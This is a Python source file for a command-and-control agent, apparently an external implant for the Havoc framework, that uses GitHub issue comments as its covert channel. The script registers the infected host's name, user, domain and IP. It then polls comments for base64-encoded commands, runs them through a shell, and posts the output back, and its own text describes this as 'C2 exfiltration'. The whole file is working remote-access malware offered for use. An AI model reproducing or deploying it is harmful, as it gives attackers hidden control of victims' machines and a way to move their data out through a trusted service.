import requests
import json
import socket
import time
import os
import sys
import random
import string
import platform
import base64
import subprocess
import traceback

# --- CONFIG ---
GITHUB_TOKEN = "ghp_XXXXXXXXXXXXXXXXXXXXXXXXXXXXX" 
REPO_OWNER = "YOUR_USERNAME"
REPO_NAME = "your_repository"
ISSUE_LABEL = "HAVOCHUB"

HEADERS = {
    "Authorization": f"token {GITHUB_TOKEN}",
    "Accept": "application/vnd.github.v3+json"
}

magic = (0x41414141).to_bytes(4, 'big')
letters = string.ascii_lowercase
agentid = str(''.join(random.choice(letters) for i in range(4))).encode('utf-8')
sleeptime = 5



# --- GITHUB FUNCTIONS ---
def create_issue():
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/issues"
    title = f"Havoc-Agent-Session-{random.randint(10000,99999)}"
    body = "Automated agent session for C2 exfiltration."
    data = {"title": title, "body": body, "labels": [ISSUE_LABEL]}
    r = requests.post(url, headers=HEADERS, json=data)
    if r.status_code == 201:
        issue = r.json()
        issue_number = issue["number"]
        issue_title = issue["title"]
        print(f"[+] New issue created : {issue_title} - ({issue_number})")
        return issue_number, issue_title
    else:
        err = r.json()
        print(err)
        traceback.print_exc()
        raise Exception("Impossible de créer une nouvelle issue Github.")

def post_comment(issue_number, payload_b64):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/issues/{issue_number}/comments"
    data = {'body': payload_b64}
    r = requests.post(url, headers=HEADERS, json=data)
    if r.status_code == 201:
        comment = r.json()
        comment_id = comment.get('id')
        return comment_id
    else:
        return False

def get_last_command(issue_number, seen_comment_ids):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/issues/{issue_number}/comments"
    r = requests.get(url, headers=HEADERS)
    comments = r.json()
    for comment in comments:
        comment_id = comment['id']
        if comment_id not in seen_comment_ids:
            text_b64 = comment.get('body','').strip()
            if text_b64 and len(text_b64)>1:
                return comment_id, text_b64
    return None, None


# --- HAVOC FUNCTIONS ---
def checkin(issue_number):
    print("[+] Checking in for taskings")
    requestdict = {"task":"gettask","data":""}
    requestblob = json.dumps(requestdict)
    size = len(requestblob) + 12
    size_bytes = size.to_bytes(4, 'big')
    agentheader = size_bytes + magic + agentid
    payload = agentheader+requestblob.encode("latin-1", errors="replace")
    payload_b64 = base64.b64encode(payload).decode("latin-1", errors="replace")
    comment_id = post_comment(issue_number, payload_b64)
    return comment_id

def register(issue_number):
    hostname = socket.gethostname()
    registerdict = {
    "AgentID": str(agentid),
    "Hostname": hostname,
    "Username": os.environ.get("USERNAME", "unknown"),
    "Domain": os.environ.get("USERDOMAIN", ""),
    "InternalIP": socket.gethostbyname(hostname),
    "Process Path": os.getcwd(),
    "Process ID": str(os.getpid()),
    "Process Parent ID": "0",
    "Process Arch": "x64",
    "Process Elevated": 0,
    "OS Build":  "1.1.1.1", # to evade crash
    "Sleep": 1,
    "Process Name": os.path.basename(sys.executable),
    "OS Version":  "1.1.1.1", # to evade crash
    }
    registerblob = json.dumps(registerdict)
    requestdict = {"task":"register","data":registerblob}
    requestblob = json.dumps(requestdict)
    size = len(requestblob) + 12
    size_bytes = size.to_bytes(4, 'big')
    agentheader = size_bytes + magic + agentid
    payload = agentheader+requestblob.encode("latin-1", errors="replace")
    payload_b64 = base64.b64encode(payload).decode("latin-1", errors="replace")
    comment_id = post_comment(issue_number, payload_b64)
    return comment_id

def runcommand(command):
    command = command.strip("\x00")
    if command == "goodbye":
        sys.exit(2)
    print(f"[+] Running command : {command}")
    p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    output, _ = p.communicate()
    output = output.decode("latin-1", errors="replace")
    output = output.strip('\n')
    output = output.strip('\r')
    print(f"[+] Output : {output}")
    return str(output)




def main():
    global agentid
    global magic
    global sleeptime
    agentheader = magic + agentid
    registered = ""
    seen_comment_ids = set()

    issue_number, issue_title = create_issue()

    #register the agent
    print("[?] trying to register the agent")
    register_comment_id = register(issue_number)

    if register_comment_id > 0:
        print("[+] Agent registered !\n")
        seen_comment_ids.add(register_comment_id)
    else:
        sys.exit()

    while True:
        # Checkin : post un commentaire de demande de tâche
        checkin_comment_id = checkin(issue_number)
        if checkin_comment_id:
            seen_comment_ids.add(checkin_comment_id)
        
        # Récupère dernière commande non traitée postée sur l'issue
        comment_id, command_b64 = get_last_command(issue_number, seen_comment_ids)
        if comment_id is not None:
            print(f"[C2] Command received in comment ID {comment_id}")
            seen_comment_ids.add(comment_id)
            try:
                command_decoded = base64.b64decode(command_b64).decode("latin-1", errors="replace")
                output = runcommand(command_decoded)
                output_b64 = base64.b64encode(output.encode("latin-1", errors="replace")).decode("latin-1", errors="replace")
                requestdict = {"task":"result","data":output}
                requestblob = json.dumps(requestdict)
                size = len(requestblob) + 12
                size_bytes = size.to_bytes(4, 'big')
                agentheader = size_bytes + magic + agentid
                payload = agentheader+requestblob.encode("latin-1", errors="replace")
                payload_b64 = base64.b64encode(payload).decode("latin-1", errors="replace")
                result_comment_id = post_comment(issue_number, payload_b64)
                seen_comment_ids.add(result_comment_id)
            except Exception as e:
                print(f"[!] Command error: {e}")
                time.sleep(sleeptime)

        time.sleep(sleeptime)

if __name__ == "__main__":
    main()
